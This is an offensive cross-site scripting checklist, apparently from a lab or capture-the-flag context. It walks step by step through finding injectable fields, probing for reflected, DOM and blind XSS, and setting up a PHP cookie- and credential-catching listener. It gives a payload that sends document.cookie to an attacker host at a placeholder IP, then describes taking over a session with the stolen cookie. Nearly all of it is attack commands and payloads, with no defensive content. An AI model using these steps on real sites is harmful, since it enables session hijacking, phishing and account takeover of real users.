# XSS Checklist

## Recon
- [ ] curl the page, grep for all input fields (`input`, `textarea`, `form`, `name=`)
- [ ] Find all pages with forms (blog posts, registration, contact, search)
- [ ] Note form action URL and method (GET/POST)
- [ ] Check JS source files for sinks (`innerHTML`, `document.write`, `html()`, `outerHTML`)

## Identify XSS Type
- [ ] Probe each parameter: `curl "?param=PROBE" | grep PROBE`
- [ ] Reflected in response → Reflected XSS
- [ ] Not reflected in response but JS reads URL params → DOM XSS
- [ ] Form says "admin will review" → Blind XSS (Stored)
- [ ] Try basic `<script>alert(1)</script>` first
- [ ] If blocked, identify HTML context and use appropriate breakout (`'>`, `">`, `onerror=`)

## PHP Listener Setup (Session Hijacking / Phishing)
- [ ] `mkdir /tmp/tmpserver && cd /tmp/tmpserver`
- [ ] Write `index.php` (cookie catcher or credential catcher)
- [ ] Write `script.js` with `new Image().src='http://<IP>:<PORT>/index.php?c='+document.cookie;`
- [ ] Start server: `sudo php -S 0.0.0.0:8000` (port 80 often in use)
- [ ] Verify reachability: `curl http://<OUR_IP>:8000/test` → check PHP terminal logs

## Blind XSS Field Detection
- [ ] Use field name in URL path to identify which field fires: `<script src=http://<IP>:8000/fieldname></script>`
- [ ] Try all breakout variants for each field: no breakout, `'>`, `">`
- [ ] Keep CMS required fields (name, email) clean — inject in optional fields (url, website, comment)
- [ ] Wait 30-60 seconds after submission for admin to review

## Cookie Stealing
- [ ] Confirm `script.js` is fetched (GET /script.js in PHP logs)
- [ ] Confirm `index.php?c=...` is called (GET /index.php?c=... in PHP logs)
- [ ] If script.js fetched but no cookie call → try `document.location` instead of `new Image()`
- [ ] Check `cookies.txt` for stolen cookie value

## Session Takeover
- [ ] Open target login page in browser
- [ ] DevTools → `Shift+F9` → Storage → `+`
- [ ] Set cookie Name and Value from stolen cookie
- [ ] Refresh page → confirm access
